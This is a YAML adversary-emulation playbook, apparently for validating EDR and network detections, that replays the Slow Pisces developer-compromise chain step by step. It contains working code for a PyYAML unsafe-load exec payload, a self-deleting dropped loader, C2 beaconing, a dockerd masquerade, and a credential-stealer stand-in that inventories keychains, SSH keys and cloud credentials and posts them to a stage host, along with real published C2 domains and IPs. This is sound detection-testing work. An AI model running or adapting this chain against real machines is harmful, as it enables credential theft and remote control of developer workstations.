steps:
  - id: step-01
    name: "Developer runs the coding-challenge project: python3 resolves the C2 and fetches /symbols/sp500"
    command: |
      mkdir -p /tmp/cortexsim-mp-027/stocks-pattern-analyzer/.cache
      dig +short en.stockslab.org @${LAB_RESOLVER:-127.0.0.53}
      cd /tmp/cortexsim-mp-027/stocks-pattern-analyzer
      python3 - <<'PY'
      import base64, os, urllib.request, urllib.error
      stage = os.environ.get("STAGE_HOST", "127.0.0.1")
      port = os.environ.get("STAGE_PORT", "8080")
      url = "http://%s:%s/symbols/sp500" % (stage, port)
      cache = ".cache/sp500.yaml"
      body, ctype = b"", ""
      try:
          req = urllib.request.Request(url, headers={"Accept": "application/json, application/yaml"})
          with urllib.request.urlopen(req, timeout=5) as r:
              body, ctype = r.read(), r.headers.get("Content-Type", "")
          print("stage host replied with Content-Type %s" % ctype)
      except (urllib.error.URLError, OSError) as exc:
          print("stage host unreachable (%s): using the lab copy of the validated-target reply" % exc)
      if "yaml" not in ctype:
          # Validated targets get application/yaml instead of JSON. The lab reply is benign:
          # it writes a self-deleting stand-in for RN Loader to ~/Public/__init__.py and runs it.
          loader = (
              "import getpass, json, os, platform, socket\n"
              "os.remove(__file__)\n"
              "info = {'user': getpass.getuser(), 'host': socket.gethostname(), 'os': platform.platform(), 'arch': platform.machine()}\n"
              "os.makedirs('/tmp/cortexsim-mp-027', exist_ok=True)\n"
              "open('/tmp/cortexsim-mp-027/rn-loader-sysinfo.json', 'w').write(json.dumps(info))\n"
              "print('cortexsim-mp-027 rn-loader stand-in ran and removed', __file__)\n"
          )
          writer = (
              "import base64, os, subprocess, sys\n"
              "pub = os.path.join(os.path.expanduser('~'), 'Public')\n"
              "if not os.path.isdir(pub):\n"
              "    os.makedirs(pub)\n"
              "    open(os.path.join(pub, '.cortexsim-mp-027-created'), 'w').close()\n"
              "dst = os.path.join(pub, '__init__.py')\n"
              "open(dst, 'w').write(base64.b64decode('%s').decode())\n"
              "subprocess.run([sys.executable, dst], check=False)\n"
          ) % base64.b64encode(loader.encode()).decode()
          body = ("!!python/object/apply:builtins.exec\n- \"import base64; exec(base64.b64decode('%s'))\"\n"
                  % base64.b64encode(writer.encode()).decode()).encode()
      with open(cache, "wb") as fh:
          fh.write(body)
      print("cortexsim-mp-027 lure project cached the /symbols/sp500 reply as %s" % cache)
      PY
    identity: developer
    mitre_technique: "T1204.002"
    # Root of the causality spine — links from the CGO (the developer's python3).
    platforms: ["linux", "macos"]
    requires_interpreters: ["python"]
    expected_detections:
      - plane: EDR
        type: IOC
        description: "The workstation resolves en.stockslab.org, a Slow Pisces C2 domain Unit 42 published; the IOC rule matches the DNS query in xdr_data and enrichment attributes it to Slow Pisces."
        ttp_ref: "TTP-2026-0186"
        detection_id: "ioc-domain-en-stockslab-org"
      - plane: EDR
        type: XQL
        description: "Validation query: python3 running from the cloned project directory opened an outbound connection carrying the /symbols/sp500 request and wrote the reply to the project's .cache, on the run host, within the run window."
        ttp_ref: "TTP-2026-0186"
        detection_id: "xql-mp-027-lure-project-python-fetches-symbols-sp500-and-caches-the-reply"

  - id: step-02
    name: "Unsafe yaml.load of the application/yaml reply writes ~/Public/__init__.py (RN Loader) and runs it"
    command: |
      cd /tmp/cortexsim-mp-027/stocks-pattern-analyzer
      python3 - <<'PY'
      data = open(".cache/sp500.yaml").read()
      try:
          import yaml
          # The lure branches on Content-Type and hands an application/yaml reply to the unsafe loader.
          yaml.load(data, Loader=yaml.UnsafeLoader)
          print("cortexsim-mp-027 PyYAML unsafe load applied !!python/object/apply:builtins.exec")
      except ImportError:
          # PyYAML absent: apply the same python/object/apply tag the unsafe loader would.
          arg = data.split("\n", 1)[1].strip()[2:].strip().strip('"')
          exec(arg)
          print("cortexsim-mp-027 PyYAML not installed: applied builtins.exec from the YAML tag directly")
      PY
    identity: developer
    mitre_technique: "T1059.006"
    causality:
      parent_step: step-01
      pivot: process_lineage
    platforms: ["linux", "macos"]
    requires_interpreters: ["python"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "python3 creates __init__.py inside the user's home Public folder, the drop path of the Slow Pisces YAML deserialisation payload; a script interpreter writing Python source into ~/Public has no developer-workflow reason."
        ttp_ref: "TTP-2026-0186"
        detection_id: "bioc-mp-027-python-writes-init-py-into-the-home-public-folder"
      - plane: EDR
        type: ABIOC
        description: "A python3 child runs ~/Public/__init__.py and that file is deleted by the same process seconds after it starts: the RN Loader in-memory pattern. The ABIOC anchors on the project python3 causality chain."
        ttp_ref: "TTP-2026-0186"
        detection_id: "abioc-mp-027-self-deleting-python-script-executed-from-the-home-public-folder"

  - id: step-03
    name: "RN Loader beacons host and OS info to the C2 and polls for commands"
    command: |
      dig +short getstockprice.com @${LAB_RESOLVER:-127.0.0.53}
      dig +short cdn.clubinfo.io @${LAB_RESOLVER:-127.0.0.53}
      python3 - <<'PY'
      import base64, json, os, platform, socket, getpass, time
      import urllib.request, urllib.error
      stage = os.environ.get("STAGE_HOST", "127.0.0.1")
      port = os.environ.get("STAGE_PORT", "8080")
      url = "http://%s:%s/" % (stage, port)
      try:
          info = json.load(open("/tmp/cortexsim-mp-027/rn-loader-sysinfo.json"))
      except (OSError, ValueError):
          info = {"user": getpass.getuser(), "host": socket.gethostname(), "os": platform.platform()}
      beacon = base64.b64encode(json.dumps(info).encode())
      for poll in range(3):
          cmd = 0
          try:
              with urllib.request.urlopen(urllib.request.Request(url, data=beacon), timeout=5) as r:
                  cmd = int((r.read().strip() or b"0")[:1])
          except (urllib.error.URLError, OSError, ValueError):
              pass
          print("cortexsim-mp-027 rn-loader poll %d: command %d" % (poll + 1, cmd))
          if cmd == 9:
              break
          # Command 0 is "sleep 20 seconds"; shortened for the lab run.
          time.sleep(2)
      PY
    identity: developer
    mitre_technique: "T1071.001"
    causality:
      parent_step: step-02
      pivot: process_lineage
    platforms: ["linux", "macos"]
    requires_interpreters: ["python"]
    expected_detections:
      - plane: EDR
        type: ABIOC
        description: "A python3 process descended from the coding-challenge project sends a Base64 host-information body to the same external host at a fixed interval and reads back a one-digit command: first-seen interval polling from a developer interpreter, anchored on the project causality chain."
        ttp_ref: "TTP-2026-0186"
        detection_id: "abioc-mp-027-developer-project-python-polls-one-external-host-at-a-fixed-interval"
      - plane: EDR
        type: IOC
        description: "The workstation resolves getstockprice.com, a published Slow Pisces Python-repository C2 domain; the IOC rule matches the DNS query in xdr_data."
        ttp_ref: "TTP-2026-0186"
        detection_id: "ioc-domain-getstockprice-com"
      - plane: EDR
        type: XQL
        description: "Hunt query: DNS queries from the workstation for any of the published Slow Pisces lure domains within the run window (en.stockslab.org, getstockprice.com, cdn.clubinfo.io)."
        ttp_ref: "TTP-2026-0186"
        detection_id: "xql-mp-027-slow-pisces-lure-domain-dns-lookups-from-the-workstation"

  - id: step-04
    name: "RN Loader command 3: decode dockerd and docker-init, run dockerd with docker-init as its argument"
    command: |
      mkdir -p /tmp/cortexsim-mp-027/.rn
      python3 - <<'PY'
      import base64, os, shutil, subprocess
      d = "/tmp/cortexsim-mp-027/.rn"
      # Command 3: Base64 content saved as dockerd, Base64 parameter saved as docker-init, then
      # dockerd runs with docker-init as its argument. The lab content is the host's own cat binary.
      content = base64.b64encode(open(shutil.which("cat"), "rb").read())
      param = base64.b64encode(b"cortexsim-mp-027-docker-init-parameter\n")
      with open(os.path.join(d, "dockerd"), "wb") as fh:
          fh.write(base64.b64decode(content))
      os.chmod(os.path.join(d, "dockerd"), 0o755)
      with open(os.path.join(d, "docker-init"), "wb") as fh:
          fh.write(base64.b64decode(param))
      rc = subprocess.run([os.path.join(d, "dockerd"), os.path.join(d, "docker-init")]).returncode
      print("cortexsim-mp-027 masqueraded dockerd exited %d" % rc)
      PY
    identity: developer
    mitre_technique: "T1036.005"
    causality:
      parent_step: step-03
      pivot: process_lineage
    platforms: ["linux", "macos"]
    requires_interpreters: ["python"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A process image named dockerd starts from a temp directory with python3 as its parent and a file named docker-init as its argument. A real Docker daemon runs from its install path under containerd or launchd, never as a child of a developer's Python interpreter."
        ttp_ref: "TTP-2026-0186"
        detection_id: "bioc-mp-027-dockerd-launched-from-a-temp-path-by-a-python-interpreter"

  - id: step-05
    name: "RN Stealer: keychain, SSH keys and AWS/kube/gcloud configs, XOR-framed R0/R64/R128/R256 to the C2"
    command: |
      python3 - <<'PY'
      import base64, glob, gzip, json, os, platform, random, socket, getpass, sys
      import urllib.request, urllib.error
      stage = os.environ.get("STAGE_HOST", "127.0.0.1")
      port = os.environ.get("STAGE_PORT", "8080")
      url = "http://%s:%s/" % (stage, port)
      victim = "%016x" % random.getrandbits(64)
      def c2(token, payload=b""):
          # RN Stealer frames every C2 call with a Base64 R<N> token and the victim id as a cookie.
          body = base64.b64encode(token.encode()) + b"." + base64.b64encode(payload)
          req = urllib.request.Request(url, data=body, headers={"Cookie": "id=" + victim})
          try:
              with urllib.request.urlopen(req, timeout=5) as r:
                  return r.read()
          except (urllib.error.URLError, OSError):
              return b""
      key = c2("R0") or b"cortexsim-mp-027-lab-xor-key"
      home = os.path.expanduser("~")
      keychain = "Library/Keychains/login.keychain-db" if sys.platform == "darwin" else ".local/share/keyrings/login.keyring"
      targets = [keychain, ".aws/credentials", ".aws/config", ".kube/config",
                 ".config/gcloud/credentials.db", ".config/gcloud/application_default_credentials.json"]
      targets += [os.path.relpath(p, home) for p in sorted(glob.glob(os.path.join(home, ".ssh", "id_*")))]
      apps_dir = "/Applications" if os.path.isdir("/Applications") else "/usr/share/applications"
      manifest = {"victim": victim, "user": getpass.getuser(), "host": socket.gethostname(),
                  "arch": platform.machine(), "apps": sorted(os.listdir(apps_dir))[:100] if os.path.isdir(apps_dir) else [],
                  "home": sorted(os.listdir(home))[:100], "files": []}
      for rel in targets:
          p = os.path.join(home, rel)
          if os.path.isfile(p):
              # Opened the way RN Stealer opens it; one byte is read and discarded. Content never leaves memory.
              with open(p, "rb") as fh:
                  fh.read(1)
              manifest["files"].append({"path": p, "size": os.path.getsize(p)})
          else:
              manifest["files"].append({"path": p, "present": False})
      blob = json.dumps(manifest).encode()
      xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(blob))
      os.makedirs("/tmp/cortexsim-mp-027", exist_ok=True)
      with open("/tmp/cortexsim-mp-027/rn-stealer-manifest.xor", "wb") as fh:
          fh.write(xored)
      c2("R64", xored)
      c2("R128", gzip.compress(xored))
      c2("R256")
      print("cortexsim-mp-027 rn-stealer stand-in: %d paths checked, names and sizes only" % len(manifest["files"]))
      PY
    platform_variants:
      macos: |
        security list-keychains -d user
        python3 - <<'PY'
        import base64, glob, gzip, json, os, platform, random, socket, getpass, sys
        import urllib.request, urllib.error
        stage = os.environ.get("STAGE_HOST", "127.0.0.1")
        port = os.environ.get("STAGE_PORT", "8080")
        url = "http://%s:%s/" % (stage, port)
        victim = "%016x" % random.getrandbits(64)
        def c2(token, payload=b""):
            # RN Stealer frames every C2 call with a Base64 R<N> token and the victim id as a cookie.
            body = base64.b64encode(token.encode()) + b"." + base64.b64encode(payload)
            req = urllib.request.Request(url, data=body, headers={"Cookie": "id=" + victim})
            try:
                with urllib.request.urlopen(req, timeout=5) as r:
                    return r.read()
            except (urllib.error.URLError, OSError):
                return b""
        key = c2("R0") or b"cortexsim-mp-027-lab-xor-key"
        home = os.path.expanduser("~")
        keychain = "Library/Keychains/login.keychain-db" if sys.platform == "darwin" else ".local/share/keyrings/login.keyring"
        targets = [keychain, ".aws/credentials", ".aws/config", ".kube/config",
                   ".config/gcloud/credentials.db", ".config/gcloud/application_default_credentials.json"]
        targets += [os.path.relpath(p, home) for p in sorted(glob.glob(os.path.join(home, ".ssh", "id_*")))]
        apps_dir = "/Applications" if os.path.isdir("/Applications") else "/usr/share/applications"
        manifest = {"victim": victim, "user": getpass.getuser(), "host": socket.gethostname(),
                    "arch": platform.machine(), "apps": sorted(os.listdir(apps_dir))[:100] if os.path.isdir(apps_dir) else [],
                    "home": sorted(os.listdir(home))[:100], "files": []}
        for rel in targets:
            p = os.path.join(home, rel)
            if os.path.isfile(p):
                # Opened the way RN Stealer opens it; one byte is read and discarded. Content never leaves memory.
                with open(p, "rb") as fh:
                    fh.read(1)
                manifest["files"].append({"path": p, "size": os.path.getsize(p)})
            else:
                manifest["files"].append({"path": p, "present": False})
        blob = json.dumps(manifest).encode()
        xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(blob))
        os.makedirs("/tmp/cortexsim-mp-027", exist_ok=True)
        with open("/tmp/cortexsim-mp-027/rn-stealer-manifest.xor", "wb") as fh:
            fh.write(xored)
        c2("R64", xored)
        c2("R128", gzip.compress(xored))
        c2("R256")
        print("cortexsim-mp-027 rn-stealer stand-in: %d paths checked, names and sizes only" % len(manifest["files"]))
        PY
    identity: developer
    mitre_technique: "T1555.001"
    causality:
      parent_step: step-03
      pivot: process_lineage
    platforms: ["linux", "macos"]
    requires_interpreters: ["python"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "python3 descended from the coding-challenge project opens the login keychain (login.keychain-db on macOS, login.keyring on Linux), ~/.ssh private keys and AWS, Kubernetes and gcloud credential files in one burst: the RN Stealer collection set."
        ttp_ref: "TTP-2026-0186"
        detection_id: "bioc-mp-027-python-opens-keychain-ssh-key-and-cloud-cli-credential-files"
      - plane: EDR
        type: XQL
        description: "Validation query: the same python3 causality chain opened three or more of the credential paths and wrote the XOR-framed manifest, on the run host, within the run window."
        ttp_ref: "TTP-2026-0186"
        detection_id: "xql-mp-027-rn-stealer-credential-file-access-on-the-run-host"

  - id: step-06
    name: "NGFW EAL leg: RN Loader C2 egress from the workstation to the report's domain/IP pairs"
    command: |
      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
      SRC_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
      [ -n "$SRC_IP" ] || SRC_IP=$(ipconfig getifaddr en0 2>/dev/null)
      [ -n "$SRC_IP" ] || SRC_IP=127.0.0.1
      SRC_HOST=$(hostname -s)
      SRC_USER=$(id -un developer 2>/dev/null || id -un)
      cat > /tmp/mp-027-ngfw-eal.yml <<YML
      campaign_id: CMP-MP-027
      name: "Slow Pisces RN Loader C2 egress from the developer workstation"
      authorized_by: "domain-consultant@paloaltonetworks.com"
      simulation_authorized: true
      c2_authorized: true
      target_allowlist:
        - "$COLLECTOR_HOST"
      dry_run: false
      tags: [mp-027, slow-pisces, rn-loader, ngfw-eal]
      steps:
        - step_id: step-01
          plugin: ngfw_eal_emitter
          params:
            collector_url: "$COLLECTOR_URL"
            event_pattern: abnormal_recurring_comms
            burst_count: 8
            iterations: 1
            dst_domain: "en.stockslab.org"
            dst_ip: "91.103.140.191"
            src_ip: "$SRC_IP"
            src_host: "$SRC_HOST"
            src_user: "$SRC_USER"
        - step_id: step-02
          plugin: ngfw_eal_emitter
          params:
            collector_url: "$COLLECTOR_URL"
            event_pattern: abnormal_comms
            iterations: 1
            dst_domain: "getstockprice.com"
            dst_ip: "70.34.245.118"
            src_ip: "$SRC_IP"
            src_host: "$SRC_HOST"
            src_user: "$SRC_USER"
      YML
      python3 -m scripts.eal_simulator.cli run /tmp/mp-027-ngfw-eal.yml --live
      echo cortexsim-mp-027-step06-ngfw-eal-rn-loader-egress-emitted
    identity: container-runtime
    mitre_technique: "T1071.001"
    # Same workstation (src_host / src_ip / src_user) as the endpoint leg: the NGFW
    # records are stitched onto the RN Loader host by entity, not by process fork.
    causality:
      parent_step: step-03
      pivot: shared_entity
    platforms: ["linux", "macos"]
    expected_detections:
      - plane: NDR
        type: ABIOC
        description: "NGFW EAL recurring small HTTPS sessions from the developer workstation to en.stockslab.org, a domain rare across the fleet: the auto-tuned recurring-communications ABIOC fires on cadence plus destination rarity, anchored to src_host."
        ttp_ref: "TTP-2026-0186"
        detection_id: "abioc-mp-027-ngfw-recurring-rare-domain-communications-from-a-developer-workstation"
      - plane: NDR
        type: IOC
        description: "The NGFW traffic record's destination 91.103.140.191 is a Slow Pisces IP Unit 42 published; the IOC rule matches dst in panw_ngfw_traffic_raw."
        ttp_ref: "TTP-2026-0186"
        detection_id: "ioc-ipv4-91-103-140-191"
      - plane: NDR
        type: XQL
        description: "Validation query: panw_ngfw_traffic_raw holds sessions from the run host (endpoint_device_name = src_host) to the published Slow Pisces domain/IP pairs within the run window."
        ttp_ref: "TTP-2026-0186"
        detection_id: "xql-mp-027-ngfw-traffic-to-published-slow-pisces-infrastructure-from-the-run-host"
      - plane: ANALYTICS
        type: Correlation
        description: "CR-MP-0027 fuses the endpoint lure/loader/stealer alerts and the NGFW C2 alerts on the shared src_host within 1800 s into one Slow Pisces developer-compromise incident."
        ttp_ref: "TTP-2026-0186"
        detection_id: "CR-MP-0027"

cleanup:
